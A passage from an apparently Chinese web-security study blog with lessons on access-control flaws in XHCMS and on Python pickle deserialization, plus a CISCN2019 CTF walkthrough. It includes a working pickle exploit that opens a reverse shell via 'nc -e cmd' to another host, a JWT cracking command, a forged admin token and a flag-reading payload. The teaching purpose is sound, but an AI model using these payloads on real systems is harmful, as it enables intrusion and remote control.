class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;On&quot;</span>); <span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;../mc-files/mc-conf.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;mc_token&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$token</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;mc_token&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$token</span> != <span class="title function_ invoke__">md5</span>(<span class="variable">$mc_config</span>[<span class="string">&#x27;user_name&#x27;</span>].<span class="string">&#x27;_&#x27;</span>.<span class="variable">$mc_config</span>[<span class="string">&#x27;user_pass&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Location:index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Location:index.php&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在post.php和page.php都出现了这么一个问题，等到他们本身的php代码都执行完之后，才在第188行进行require：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require</span> <span class="string">&#x27;head.php&#x27;</span> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>而如果要进行文章删除的功能，在require之前的代码中执行，因为造成了垂直越权的文章删除</p><h4 id="未授权-访问控制-XHCMS-代码未引用验证"><a href="#未授权-访问控制-XHCMS-代码未引用验证" class="headerlink" title="#未授权-访问控制-XHCMS-代码未引用验证"></a>#未授权-访问控制-XHCMS-代码未引用验证</h4><p>2、没有验证 触发当前操作的用户权限</p><p>在代码中注释掉这行验证登录的代码文件</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230222220928870.png" alt="image-20230222220928870"></p><p>访问后台地址登录将会直接登录成功</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230222220814779.png" alt="image-20230222220814779"></p><h4 id="未授权-脆弱机制-XHCMS-Cookie脆弱验证"><a href="#未授权-脆弱机制-XHCMS-Cookie脆弱验证" class="headerlink" title="#未授权-脆弱机制-XHCMS-Cookie脆弱验证"></a>#未授权-脆弱机制-XHCMS-Cookie脆弱验证</h4><p>3、有验证 验证产生在用户凭据证上  cookie jwt token</p><p>app&#x3D;”熊海内容管理系统(SEACMS)”</p><p>环境靶场：xhcms</p><p>通过代码审计得知，只要cookie认证是user&#x3D;&#x3D;不为空即可</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/3021911-20230203214454269-55199108.png" alt="img"></p><p>（1）找到后台登录入口</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/3021911-20230203215154512-368398547.png" alt="img"></p><p>（2）抓包，添加cookie</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/3021911-20230203215310917-857953540.png" alt="img"></p><p>（3）成功进入后台</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/3021911-20230203221319545-338237601.png" alt="img"></p><h4 id="弱机制-空口令机制-Redis-amp-Weblogic弱机制"><a href="#弱机制-空口令机制-Redis-amp-Weblogic弱机制" class="headerlink" title="#弱机制-空口令机制-Redis&amp;Weblogic弱机制"></a>#弱机制-空口令机制-Redis&amp;Weblogic弱机制</h4><p><a href="http://vulfocus.io/">http://vulfocus.io/</a></p><p><a href="https://vulhub.org/">https://vulhub.org/</a></p><p>“weblogic” &amp;&amp; port&#x3D;”7001”</p><p>redis未授权漏洞产生原因，复现案例：(<a href="https://blog.csdn.net/dreamthe/article/details/123427989">https://blog.csdn.net/dreamthe/article/details/123427989</a>)</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230222221444489.png" alt="image-20230222221444489"></p><p>weblogic未授权漏洞产生原因，复现案例：(<a href="https://blog.csdn.net/qq_32731075/article/details/117673410">https://blog.csdn.net/qq_32731075/article/details/117673410</a>)</p><p><img src="/../images/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/image-20230222222429046.png" alt="image-20230222222429046"></p><h4 id="检测类-工具项目-Authz-amp-Secscan-Authcheck"><a href="#检测类-工具项目-Authz-amp-Secscan-Authcheck" class="headerlink" title="#检测类-工具项目-Authz&amp;Secscan-Authcheck"></a>#检测类-工具项目-Authz&amp;Secscan-Authcheck</h4><p>中通安装踩坑：<a href="https://bigyoung.cn/posts/250/">https://bigyoung.cn/posts/250/</a>   </p><p>(<a href="https://sec.bigyoung.cn/article/SecScanAuthcheck/">https://sec.bigyoung.cn/article/SecScanAuthcheck/</a>)</p><p><a href="https://github.com/ztosec/secscan-authcheck">https://github.com/ztosec/secscan-authcheck</a></p><blockquote><p>黑盒测试流程</p><p>（1）先通过工具把所以域名爆破出来，看看有没有含义敏感数据的页面</p><p>（2）在功能点测试中，修改所有和权限挂钩的参数，尝试判断存不存在越权漏洞</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;知识点：&quot;&gt;&lt;a href=&quot;#知识点：&quot; class=&quot;headerlink&quot; title=&quot;#知识点：&quot;&gt;&lt;/a&gt;#知识点：&lt;/h3&gt;&lt;p&gt;1、水平越权-同级用户权限共享&lt;/p&gt;
&lt;p&gt;2、垂直越权-低高用户权限共享&lt;/p&gt;
&lt;p&gt;3、访问控制-验证丢失&amp;am</summary>
      
    
    
    
    <category term="Web攻防" scheme="http://example.com/categories/Web%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>Day48 WEB攻防-通用漏洞&amp;Py反序列化&amp;链构造&amp;自动审计bandit&amp;魔术方法</title>
    <link href="http://example.com/2023/02/03/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"/>
    <id>http://example.com/2023/02/03/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/</id>
    <published>2023-02-02T17:52:08.000Z</published>
    <updated>2023-02-21T13:05:31.009Z</updated>
    
    <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、Python-反序列化函数使用</p><p>2、Python-反序列化魔术方法</p><p>3、Python-反序列化POP链构造</p><p>4、Python-自动化审计bandit使用</p><h3 id="前置知识："><a href="#前置知识：" class="headerlink" title="#前置知识："></a>#前置知识：</h3><h5 id="函数使用："><a href="#函数使用：" class="headerlink" title="函数使用："></a>函数使用：</h5><p>pickle.dump(obj, file) : 将对象序列化后保存到文件</p><p>pickle.load(file) : 读取文件， 将文件中的序列化内容反序列化为对象</p><p>pickle.dumps(obj) : 将对象序列化成字符串格式的字节流</p><p>pickle.loads(bytes_obj) : 将字符串格式的字节流反序列化为对象</p><h5 id="魔术方法："><a href="#魔术方法：" class="headerlink" title="魔术方法："></a>魔术方法：</h5><p><strong>reduce</strong>()      反序列化时调用</p><p><strong>reduce_ex</strong>()   反序列化时调用</p><p><strong>setstate</strong>()    反序列化时调用</p><p><strong>getstate</strong>()    序列化时调用</p><h5 id="各类语言函数："><a href="#各类语言函数：" class="headerlink" title="各类语言函数："></a>各类语言函数：</h5><p>Java： Serializable Externalizable接口、fastjson、jackson、gson、ObjectInputStream.read、ObjectObjectInputStream.readUnshared、XMLDecoder.read、ObjectYaml.loadXStream.fromXML、ObjectMapper.readValue、JSON.parseObject等</p><p>PHP： serialize()、 unserialize() </p><p>Python：pickle marshal PyYAML shelve PIL unzip</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ 原理-反序列化魔术方法-调用理解</p><p>➢ CTF-反序列化漏洞利用-构造&amp;RCE</p><p>➢ CTF-CISCN2019华北-JWT&amp;反序列化</p><p>➢ 代码审计-自动化工具-bandit安装及使用</p><h3 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h3><h4 id="原理-反序列化魔术方法-调用理解"><a href="#原理-反序列化魔术方法-调用理解" class="headerlink" title="#原理-反序列化魔术方法-调用理解"></a>#原理-反序列化魔术方法-调用理解</h4><p>-魔术方法利用：</p><p><strong>reduce</strong>()         反序列化时调用</p><p><strong>reduce_ex</strong>()   反序列化时调用</p><p><strong>setstate</strong>()       反序列化时调用</p><p><strong>getstate</strong>()       序列化时调用</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">-代码块：</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment">##### \#反序列化魔术方法调用-__reduce__() __reduce_ex__() __setstate__()</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">​    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">​        <span class="built_in">print</span>(<span class="string">&#x27;反序列化调用&#x27;</span>)</span><br><span class="line">​        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;calc&#x27;</span>,))</span><br><span class="line">a = A()</span><br><span class="line">p_a = pickle.dumps(a)</span><br><span class="line">pickle.loads(p_a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;==========&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(p_a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SerializePerson</span>():</span><br><span class="line">​    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">​        self.name = name</span><br><span class="line"></span><br><span class="line">​    \<span class="comment"># 构造 __setstate__ 方法</span></span><br><span class="line">​    <span class="keyword">def</span> <span class="title function_">__setstate__</span>(<span class="params">self, name</span>):</span><br><span class="line">​        os.system(<span class="string">&#x27;calc&#x27;</span>)  <span class="comment"># 恶意代码</span></span><br><span class="line">tmp = pickle.dumps(SerializePerson(<span class="string">&#x27;tom&#x27;</span>))  <span class="comment">#序列化</span></span><br><span class="line">pickle.loads(tmp)  <span class="comment"># 反序列化 此时会弹出计算器</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\<span class="comment">#序列化魔术方法调用-__getstate__</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">​    <span class="keyword">def</span> <span class="title function_">__getstate__</span>(<span class="params">self</span>):</span><br><span class="line">​        <span class="built_in">print</span>(<span class="string">&#x27;序列化调用&#x27;</span>)</span><br><span class="line">​        os.system(<span class="string">&#x27;calc&#x27;</span>)</span><br><span class="line">a = A()</span><br><span class="line">p_a = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;==========&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(p_a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\<span class="comment">#反序列化安全漏洞产生-DEMO</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">​    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, func, arg</span>):</span><br><span class="line">​        self.func = func</span><br><span class="line">​        self.arg = arg</span><br><span class="line">​        <span class="built_in">print</span>(<span class="string">&#x27;This is A&#x27;</span>)</span><br><span class="line">​    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">​        <span class="built_in">print</span>(<span class="string">&#x27;反序列化调用&#x27;</span>)</span><br><span class="line">​        <span class="keyword">return</span> (self.func, self.arg)</span><br><span class="line">a = A(os.system, (<span class="string">&#x27;calc&#x27;</span>,))</span><br><span class="line">p_a = pickle.dumps(a)</span><br><span class="line">pickle.loads(p_a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;==========&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(p_a)</span><br></pre></td></tr></table></figure><h4 id="CTF-反序列化漏洞利用-构造-amp-RCE"><a href="#CTF-反序列化漏洞利用-构造-amp-RCE" class="headerlink" title="#CTF-反序列化漏洞利用-构造&amp;RCE"></a>#CTF-反序列化漏洞利用-构造&amp;RCE</h4><p>环境介绍：利用Python-flask搭建的web应用，获取当前用户的信息，进行展示，在获取用户的信息时，通过对用户数据进行反序列化获取导致的安全漏洞！</p><p>Server服务器：web应用接收cookie里面的user值，对其进行反序列化操作</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">try</span>:</span><br><span class="line">​        user = base64.b64decode(request.cookies.get(<span class="string">&#x27;user&#x27;</span>))</span><br><span class="line">​        user = pickle.loads(user)</span><br><span class="line">​        username = user[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">​    <span class="keyword">except</span>:</span><br><span class="line">​        username = <span class="string">&quot;Guest&quot;</span></span><br><span class="line">​    <span class="keyword">return</span> <span class="string">&quot;Hello %s&quot;</span> % username</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">​    app.run(</span><br><span class="line">​        host=<span class="string">&#x27;192.168.1.3&#x27;</span>,</span><br><span class="line">​        port=<span class="number">5000</span>,</span><br><span class="line">​        debug=<span class="literal">True</span></span><br><span class="line">​    )</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Hacker服务器：cookie植入user值,user值就是生成的恶意序列化数据</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">​    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">​        s=<span class="string">&#x27;c:/nc -e cmd 192.168.46.137 6666&#x27;</span></span><br><span class="line">​        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line">e = exp()</span><br><span class="line">s = pickle.dumps(e)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">response = requests.get(<span class="string">&quot;http://192.168.1.3:5000/&quot;</span>, cookies=<span class="built_in">dict</span>(</span><br><span class="line">​    user=base64.b64encode(s).decode()</span><br><span class="line">))</span><br><span class="line"><span class="built_in">print</span>(response.content)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>hacker将反弹shell的命令进行序列化并且base64加密</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221160547454.png" alt="image-20230221160547454"></p><p>在另一台linux服务器上监听5566</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221160840503.png" alt="image-20230221160840503"></p><p>将序列化后base64编码复制下来，在受害者server的网站抓包，并加上cookie一栏，添加user值</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221160938842.png" alt="image-20230221160938842"></p><p>发包后，可获得shell</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221161031516.png" alt="image-20230221161031516"></p><h4 id="CTF-CISCN2019华北-JWT-amp-反序列化"><a href="#CTF-CISCN2019华北-JWT-amp-反序列化" class="headerlink" title="#CTF-CISCN2019华北-JWT&amp;反序列化"></a>#CTF-CISCN2019华北-JWT&amp;反序列化</h4><p>通过提示-&gt;寻找LV6-&gt;购买修改支付逻辑-&gt;绕过admin限制需修改jwt值-&gt;爆破jwt密匙-&gt;重组jwt值成为admin-&gt;购买进入会员中心-&gt;源码找到文件压缩源码-&gt;Python代码审计反序列化-&gt;构造读取flag代码进行序列化打印-&gt;提交获取</p><p>考点1：JWT 身份验证 攻击点：</p><p><a href="https://www.cnblogs.com/vege/p/14468030.html">https://www.cnblogs.com/vege/p/14468030.html</a></p><p><a href="https://github.com/ck00004/c-jwt-cracker">https://github.com/ck00004/c-jwt-cracker</a></p><p>考点2：Python 代码审计 反序列化：</p><p>自动工具：<a href="https://github.com/PyCQA/bandit">https://github.com/PyCQA/bandit</a></p><p>参考资料：<a href="https://github.com/bit4woo/python_sec">https://github.com/bit4woo/python_sec</a></p><p>1、获取LV6</p><p>2、购买后伪造admin身份:</p><p>获取密匙：</p><p>&#x2F;c-jwt-cracker</p><p>.&#x2F;jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InhpYW9kaSJ9.UHCykJtUJ4jeYAWAYFU73QiNhn7mZLUHE7kKo4oJpK8</p><p>重组密文：</p><p>修改jwt网站：<a href="https://jwt.io/">https://jwt.io/</a>  爆破后的密钥：1Kun</p><p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo</p><p>3、代码审计-反序列化</p><p>伪造Admin后发现返回数据包存在源码下载，下载后代码审计：</p><p>测试触发：URL对应代码块：路由-&gt;文件</p><p>触发代码Payload:（源码是2版本）</p><p>要注意对方的python是什么版本，自己就用什么版本书写payload，否则会出错(可以通过一些函数判断如：python2的print内容不需要括号，python3则需要加上括号)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">payload</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">​    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">​       <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="built_in">print</span> a</span><br></pre></td></tr></table></figure><p>Payload：</p><p>c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27&#x2F;flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</p><h5 id="实现过程："><a href="#实现过程：" class="headerlink" title="实现过程："></a>实现过程：</h5><p>打开发现要找到lv6的</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221162926829.png" alt="image-20230221162926829"></p><p>观察request包发现如果是lv4则有lv4.png,所以通过这个规律用python脚本找到lv6.png在哪一页</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221163107392.png" alt="image-20230221163107392"></p><p>1、获取LV6</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">​    url=<span class="string">&#x27;http://119.45.216.198:8083/shop?page=&#x27;</span>+<span class="built_in">str</span>(i)</span><br><span class="line">​    result=requests.get(url).content</span><br><span class="line">​    <span class="keyword">try</span>:</span><br><span class="line">​        <span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> result.decode(<span class="string">&#x27;utf-8&#x27;</span>):</span><br><span class="line">​            <span class="built_in">print</span>(<span class="string">&#x27;-&gt;&#x27;</span>+url+<span class="string">&#x27;|yes&#x27;</span>)</span><br><span class="line">​            <span class="keyword">break</span></span><br><span class="line">​        <span class="keyword">else</span>:</span><br><span class="line">​            <span class="built_in">print</span>(<span class="string">&#x27;-&gt;&#x27;</span> + url + <span class="string">&#x27;|no&#x27;</span>)</span><br><span class="line">​    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">​        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>在181页停止，所以是在181页</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221163255545.png" alt="image-20230221163255545"></p><p>访问url181页</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221163331221.png" alt="image-20230221163331221"></p><p>进入后点击购买lv6发现失败，原因是钱不够</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221163433129.png" alt="image-20230221163433129"></p><p>抓包将折扣0.8改为0.0000000008</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221163558845.png" alt="image-20230221163558845"></p><p>发现需要admin才能改折扣</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221163629740.png" alt="image-20230221163629740"></p><p>刚才抓的数据包发现有jwt验证，考虑尝试修改jwt</p><p><img src="/../images/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/image-20230221163738225.png" alt="image-20230221163738225"></p><p>在jwt网站修改为admin，但是发现需要密匙才能修改成功</p><p><img 